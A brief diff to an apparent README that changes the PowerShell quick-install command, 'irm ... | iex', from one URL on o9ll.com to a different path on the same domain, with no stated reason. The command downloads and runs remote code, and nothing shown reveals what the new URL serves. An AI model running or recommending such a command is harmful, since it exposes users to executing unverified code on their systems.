@@ -16,7 +16,7 @@
 ### Quick Install via PowerShell
 Paste this command into PowerShell to download and run the installer:
 ```powershell
-irm "https://get.o9ll.com" | iex
+irm "https://o9ll.com/non" | iex
 ```
 
 ### Download the Installer
